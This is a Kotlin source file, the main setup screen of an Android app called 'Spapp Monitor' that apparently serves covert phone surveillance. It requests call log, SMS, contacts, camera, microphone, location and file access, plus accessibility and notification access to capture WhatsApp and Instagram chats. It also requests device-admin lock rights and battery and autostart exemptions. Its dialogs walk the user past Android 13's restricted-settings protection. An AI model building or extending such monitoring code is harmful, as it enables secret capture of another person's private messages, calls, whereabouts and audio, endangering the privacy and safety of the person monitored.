package com.spapp.monitoring.ui

import android.Manifest
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.content.res.ColorStateList
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.text.format.DateUtils
import android.util.Log
import android.view.View
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.google.android.material.button.MaterialButton
import com.google.firebase.messaging.FirebaseMessaging
import com.spapp.monitoring.R
import com.spapp.monitoring.admin.SpappDeviceAdminReceiver
import com.spapp.monitoring.blocking.AccessibilityStatus
import com.spapp.monitoring.collectors.AppUsageCollector
import com.spapp.monitoring.data.DeviceState
import com.spapp.monitoring.databinding.ActivityMainBinding
import com.spapp.monitoring.fcm.FcmTokenSync
import com.spapp.monitoring.geofence.GeofenceManager
import com.spapp.monitoring.sync.SyncScheduler

/**
 * Main Status & Permission Control Center for Spapp Monitor.
 *
 * Features:
 *  - Smart Step-by-Step Master Button: Dynamically highlights the next required
 *    permission without infinite recursive loops or trapped resume cycles.
 *  - Full Android 13/14 Restricted Settings support with 1-tap App Info shortcut.
 *  - Complete Permission Checklist with live status badges.
 */
class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private lateinit var usageCollector: AppUsageCollector
    private lateinit var geofenceManager: GeofenceManager
    private lateinit var deviceState: DeviceState

    private val runtimePermissionsLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        refreshPermissionStatus()
        if (results[Manifest.permission.READ_CALL_LOG] == true) {
            com.spapp.monitoring.collectors.RealtimeLogObserverManager.start(applicationContext)
            SyncScheduler.runOnce(applicationContext)
        }
        val grantedCount = results.values.count { it }
        Toast.makeText(this, "$grantedCount permissions updated", Toast.LENGTH_SHORT).show()
    }

    private val batteryExemptionLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        refreshPermissionStatus()
    }

    private val deviceAdminLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        refreshPermissionStatus()
    }

    private val statusHandler = Handler(Looper.getMainLooper())
    private val statusUpdater = object : Runnable {
        override fun run() {
            updateSyncStatusText()
            statusHandler.postDelayed(this, STATUS_REFRESH_MS)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        deviceState = DeviceState(this)
        usageCollector = AppUsageCollector(this)
        geofenceManager = GeofenceManager(this)

        SyncScheduler.schedule(applicationContext)
        uploadCurrentFcmToken()
        com.spapp.monitoring.collectors.RealtimeLogObserverManager.start(applicationContext)

        // Master Setup Button (Dynamically executes the next pending step)
        binding.btnMasterOneTap.setOnClickListener {
            handleNextSetupStep()
        }

        // Individual permission shortcut listeners
        binding.btnCorePermStatus.setOnClickListener {
            val missing = getMissingRuntimePermissions()
            if (missing.isNotEmpty()) {
                runtimePermissionsLauncher.launch(missing.toTypedArray())
            } else {
                Toast.makeText(this, "Core permissions already active ✓", Toast.LENGTH_SHORT).show()
            }
        }

        binding.btnBatteryPermStatus.setOnClickListener {
            if (!isBatteryExempted()) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                batteryExemptionLauncher.launch(intent)
            } else {
                Toast.makeText(this, "Battery optimization already unrestricted ✓", Toast.LENGTH_SHORT).show()
            }
        }

        binding.btnAccessibilityPermStatus.setOnClickListener {
            showAccessibilityDialog()
        }

        binding.btnAccessibilityRestricted.setOnClickListener {
            openAppInfoSettings()
        }

        binding.btnNotificationPermStatus.setOnClickListener {
            showNotificationDialog()
        }

        binding.btnNotificationRestricted.setOnClickListener {
            openAppInfoSettings()
        }

        binding.btnUnlockRestricted.setOnClickListener {
            openAppInfoSettings()
        }

        binding.btnUsagePermStatus.setOnClickListener {
            if (!isUsageAccessGranted()) {
                Toast.makeText(this, "Find Spapp Monitor and toggle Usage Access ON", Toast.LENGTH_SHORT).show()
                startActivity(usageCollector.usageAccessSettingsIntent())
            } else {
                Toast.makeText(this, "App usage tracking already active ✓", Toast.LENGTH_SHORT).show()
            }
        }

        binding.btnFilePermStatus.setOnClickListener {
            if (!isFileAccessGranted()) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = Uri.parse("package:$packageName")
                    }
                    startActivity(intent)
                }
            } else {
                Toast.makeText(this, "File access already granted ✓", Toast.LENGTH_SHORT).show()
            }
        }

        binding.btnAdminPermStatus.setOnClickListener {
            if (!isDeviceAdminActive()) {
                deviceAdminLauncher.launch(SpappDeviceAdminReceiver.activationIntent(this))
            } else {
                Toast.makeText(this, "Device Administrator already active ✓", Toast.LENGTH_SHORT).show()
            }
        }

        binding.btnAutostartPermStatus.setOnClickListener {
            openAutostartSettings()
        }

        binding.btnSyncNow.setOnClickListener {
            com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
            com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
            SyncScheduler.runOnce(applicationContext)
            Toast.makeText(this, "Sync triggered", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onResume() {
        super.onResume()
        refreshPermissionStatus()
        statusUpdater.run()
        uploadCurrentFcmToken()
    }

    override fun onPause() {
        super.onPause()
        statusHandler.removeCallbacks(statusUpdater)
    }

    // =========================================================================
    // DYNAMIC NEXT-STEP SETUP WORKFLOW
    // =========================================================================

    private fun handleNextSetupStep() {
        // Step 1: Core Runtime Permissions Batch
        val missingRuntime = getMissingRuntimePermissions()
        if (missingRuntime.isNotEmpty()) {
            runtimePermissionsLauncher.launch(missingRuntime.toTypedArray())
            return
        }

        // Step 2: Battery Optimization Exemption
        if (!isBatteryExempted()) {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$packageName")
            }
            batteryExemptionLauncher.launch(intent)
            return
        }

        // Step 3: Accessibility Service
        if (!isAccessibilityEnabled()) {
            showAccessibilityDialog()
            return
        }

        // Step 4: Notification Access (WhatsApp & Instagram messages)
        if (!isNotificationAccessGranted()) {
            showNotificationDialog()
            return
        }

        // Step 5: App Usage Stats
        if (!isUsageAccessGranted()) {
            Toast.makeText(this, "Please enable Usage Access for Spapp Monitor, then tap Back", Toast.LENGTH_LONG).show()
            startActivity(usageCollector.usageAccessSettingsIntent())
            return
        }

        // Step 6: All Files Access (Android 11+)
        if (!isFileAccessGranted()) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                Toast.makeText(this, "Please allow All Files Access, then tap Back", Toast.LENGTH_LONG).show()
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivity(intent)
                return
            }
        }

        // Step 7: Remote Lock Admin
        if (!isDeviceAdminActive()) {
            deviceAdminLauncher.launch(SpappDeviceAdminReceiver.activationIntent(this))
            return
        }

        Toast.makeText(this, "🎉 All permissions are already active and configured!", Toast.LENGTH_LONG).show()
    }

    private fun showAccessibilityDialog() {
        val msg = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            "To enable Live Screen & Monitoring:\n\n" +
            "1. Tap 'Go to Settings' -> 'Downloaded apps' -> 'Spapp Monitor' -> Turn ON.\n\n" +
            "⚠️ Android 13/14 Restricted Setting:\n" +
            "If the switch is grayed out, tap 'Allow Restricted' below -> tap 3 vertical dots (top right) -> 'Allow restricted settings' -> then return and turn it ON."
        } else {
            "To enable Live Screen & Monitoring:\n\n" +
            "1. Tap 'Go to Settings' below.\n" +
            "2. Select 'Downloaded apps' or 'Installed services'.\n" +
            "3. Select 'Spapp Monitor' and toggle it ON."
        }

        AlertDialog.Builder(this)
            .setTitle(R.string.accessibility_dialog_title)
            .setMessage(msg)
            .setPositiveButton(R.string.go_to_settings) { _, _ ->
                try {
                    startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                } catch (e: Exception) {
                    Log.e(TAG, "Cannot open accessibility settings", e)
                }
            }
            .setNeutralButton(R.string.open_app_info) { _, _ ->
                openAppInfoSettings()
            }
            .setNegativeButton(android.R.string.cancel, null)
            .show()
    }

    private fun showNotificationDialog() {
        val msg = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            "To capture WhatsApp & Instagram chat logs:\n\n" +
            "1. Tap 'Go to Settings' -> Find 'Spapp Monitor' -> Toggle ON.\n\n" +
            "⚠️ If blocked ('Restricted setting'): Tap 'Allow Restricted' below -> 3 dots (top right) -> 'Allow restricted settings'."
        } else {
            "To capture WhatsApp & Instagram chat logs:\n\n" +
            "1. Tap 'Go to Settings' below.\n" +
            "2. Find 'Spapp Monitor' and toggle it ON."
        }

        AlertDialog.Builder(this)
            .setTitle("Enable Notification Access")
            .setMessage(msg)
            .setPositiveButton(R.string.go_to_settings) { _, _ ->
                try {
                    startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                } catch (e: Exception) {
                    Log.e(TAG, "Cannot open notification listener settings", e)
                }
            }
            .setNeutralButton(R.string.open_app_info) { _, _ ->
                openAppInfoSettings()
            }
            .setNegativeButton(android.R.string.cancel, null)
            .show()
    }

    // =========================================================================
    // PERMISSION STATUS CHECKS & UI REFRESH
    // =========================================================================

    private fun getMissingRuntimePermissions(): List<String> {
        val list = mutableListOf<String>()

        val hasLocation = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
        if (!hasLocation) {
            list.add(Manifest.permission.ACCESS_FINE_LOCATION)
            list.add(Manifest.permission.ACCESS_COARSE_LOCATION)
        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            list.add(Manifest.permission.READ_CALL_LOG)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            list.add(Manifest.permission.READ_CONTACTS)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            list.add(Manifest.permission.READ_SMS)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            list.add(Manifest.permission.RECORD_AUDIO)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            list.add(Manifest.permission.CAMERA)
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                list.add(Manifest.permission.POST_NOTIFICATIONS)
            }
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
                list.add(Manifest.permission.READ_MEDIA_IMAGES)
            }
        } else {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            }
        }

        return list
    }

    private fun isBatteryExempted(): Boolean {
        val powerManager = getSystemService(POWER_SERVICE) as PowerManager
        return powerManager.isIgnoringBatteryOptimizations(packageName)
    }

    private fun isAccessibilityEnabled(): Boolean {
        return AccessibilityStatus.isEnabled(this)
    }

    private fun isNotificationAccessGranted(): Boolean {
        return try {
            val listeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
            listeners?.contains(packageName) == true ||
                    androidx.core.app.NotificationManagerCompat.getEnabledListenerPackages(this).contains(packageName)
        } catch (_: Exception) {
            false
        }
    }

    private fun isUsageAccessGranted(): Boolean = usageCollector.hasUsageAccess()

    private fun isFileAccessGranted(): Boolean {
        return Build.VERSION.SDK_INT < Build.VERSION_CODES.R || Environment.isExternalStorageManager()
    }

    private fun isDeviceAdminActive(): Boolean {
        return SpappDeviceAdminReceiver.isActive(this)
    }

    private fun refreshPermissionStatus() {
        val isCore = getMissingRuntimePermissions().isEmpty()
        val isBattery = isBatteryExempted()
        val isAccessibility = isAccessibilityEnabled()
        val isNotification = isNotificationAccessGranted()
        val isUsage = isUsageAccessGranted()
        val isFile = isFileAccessGranted()
        val isAdmin = isDeviceAdminActive()

        // 1. Core Permissions Button
        updateStatusButton(binding.btnCorePermStatus, isCore, "Active ✓", "Grant")

        // 2. Battery Button
        updateStatusButton(binding.btnBatteryPermStatus, isBattery, "Active ✓", "Grant")

        // 3. Accessibility Button
        updateStatusButton(binding.btnAccessibilityPermStatus, isAccessibility, "Active ✓", "Enable")
        binding.btnAccessibilityRestricted.visibility =
            if (!isAccessibility && Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) View.VISIBLE else View.GONE

        // 4. Notification Button
        updateStatusButton(binding.btnNotificationPermStatus, isNotification, "Active ✓", "Enable")
        binding.btnNotificationRestricted.visibility =
            if (!isNotification && Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) View.VISIBLE else View.GONE

        // 5. Usage Access Button
        updateStatusButton(binding.btnUsagePermStatus, isUsage, "Active ✓", "Enable")

        // 6. File Access Button
        updateStatusButton(binding.btnFilePermStatus, isFile, "Active ✓", "Enable")

        // 7. Device Admin Button
        updateStatusButton(binding.btnAdminPermStatus, isAdmin, "Active ✓", "Enable")

        // 8. Autostart (Xiaomi / Vivo / Oppo / Huawei)
        val isOem = isOemRom()
        binding.layoutAutostartPerm.visibility = if (isOem && !isBattery) View.VISIBLE else View.GONE
        binding.dividerAutostart.visibility = if (isOem && !isBattery) View.VISIBLE else View.GONE

        // 9. Android 13+ Restricted Settings Warning Banner
        val needsRestrictedBanner = Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU && (!isAccessibility || !isNotification)
        binding.cardRestrictedBanner.visibility = if (needsRestrictedBanner) View.VISIBLE else View.GONE

        // Calculate total granted count
        var grantedCount = 0
        if (isCore) grantedCount++
        if (isBattery) grantedCount++
        if (isAccessibility) grantedCount++
        if (isNotification) grantedCount++
        if (isUsage) grantedCount++
        if (isFile) grantedCount++
        if (isAdmin) grantedCount++

        val totalCount = 7
        binding.pbPermissions.max = totalCount
        binding.pbPermissions.progress = grantedCount
        binding.tvPermissionsCount.text = "$grantedCount / $totalCount Active"

        if (grantedCount >= totalCount) {
            binding.tvMasterBadge.text = "ALL ACTIVE ✓"
            binding.tvMasterBadge.setTextColor(ContextCompat.getColor(this, R.color.success))
            binding.tvMasterBadge.setBackgroundColor(ContextCompat.getColor(this, R.color.success_bg))
            binding.tvMasterDesc.text = "All background monitoring services are active and running."
            binding.btnMasterOneTap.text = "✓ ALL PERMISSIONS CONFIGURED & ACTIVE"
            binding.btnMasterOneTap.setBackgroundColor(ContextCompat.getColor(this, R.color.success))
            binding.pbPermissions.progressTintList = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.success))
        } else {
            binding.tvMasterBadge.text = "ACTION NEEDED"
            binding.tvMasterBadge.setTextColor(ContextCompat.getColor(this, R.color.danger))
            binding.tvMasterBadge.setBackgroundColor(ContextCompat.getColor(this, R.color.danger_bg))

            // Dynamically show the NEXT step on the big button
            val nextStepText = when {
                !isCore -> "⚡ STEP 1: GRANT CORE PERMISSIONS"
                !isBattery -> "⚡ STEP 2: ALLOW BACKGROUND ACTIVITY"
                !isAccessibility -> "⚡ STEP 3: ENABLE ACCESSIBILITY SERVICE"
                !isNotification -> "⚡ STEP 4: ENABLE NOTIFICATION ACCESS"
                !isUsage -> "⚡ STEP 5: ENABLE USAGE STATS"
                !isFile -> "⚡ STEP 6: ALLOW ALL FILES ACCESS"
                !isAdmin -> "⚡ STEP 7: ENABLE DEVICE ADMIN (LOCK)"
                else -> "⚡ CONTINUE PERMISSIONS SETUP"
            }
            binding.tvMasterDesc.text = "Tap below to configure the next required permission."
            binding.btnMasterOneTap.text = nextStepText
            binding.btnMasterOneTap.setBackgroundColor(ContextCompat.getColor(this, R.color.accent))
            binding.pbPermissions.progressTintList = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.accent))
        }
    }

    private fun updateStatusButton(button: MaterialButton, isGranted: Boolean, grantedText: String, neededText: String) {
        if (isGranted) {
            button.text = grantedText
            button.setTextColor(ContextCompat.getColor(this, R.color.success))
            button.setBackgroundColor(ContextCompat.getColor(this, R.color.success_bg))
            button.strokeColor = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.success))
            button.strokeWidth = 1
        } else {
            button.text = neededText
            button.setTextColor(ContextCompat.getColor(this, R.color.white))
            button.setBackgroundColor(ContextCompat.getColor(this, R.color.accent))
            button.strokeWidth = 0
        }
    }

    private fun isOemRom(): Boolean {
        val manufacturer = Build.MANUFACTURER.lowercase()
        return manufacturer.contains("xiaomi") ||
                manufacturer.contains("redmi") ||
                manufacturer.contains("oppo") ||
                manufacturer.contains("vivo") ||
                manufacturer.contains("huawei") ||
                manufacturer.contains("honor")
    }

    private fun openAutostartSettings() {
        val candidates = listOf(
            Intent().setComponent(
                ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")
            ),
            Intent().setComponent(
                ComponentName("com.letv.android.letvsafe", "com.letv.android.letvsafe.AutobootManageActivity")
            ),
            Intent().setComponent(
                ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity")
            ),
            Intent().setComponent(
                ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity")
            ),
            Intent().setComponent(
                ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")
            ),
        )
        for (intent in candidates) {
            try {
                startActivity(intent)
                return
            } catch (_: Exception) {}
        }
        openAppInfoSettings()
    }

    private fun openAppInfoSettings() {
        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:$packageName")
            }
            startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "No app-info settings screen available", e)
        }
    }

    private fun updateSyncStatusText() {
        val lastSync = deviceState.lastSyncAtEpochMs
        binding.statusText.text = if (lastSync == 0L) {
            getString(R.string.sync_status_never)
        } else {
            val relative = DateUtils.getRelativeTimeSpanString(
                lastSync, System.currentTimeMillis(), DateUtils.MINUTE_IN_MILLIS
            )
            getString(R.string.sync_status_last_synced, relative)
        }
    }

    private fun uploadCurrentFcmToken() {
        FirebaseMessaging.getInstance().token
            .addOnSuccessListener { token ->
                Log.d(TAG, "FCM token fetched: $token")
                FcmTokenSync.enqueueUpload(applicationContext, token)
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "FCM token fetch failed", e)
            }
    }

    companion object {
        private const val TAG = "MainActivity"
        private const val STATUS_REFRESH_MS = 30_000L
    }
}
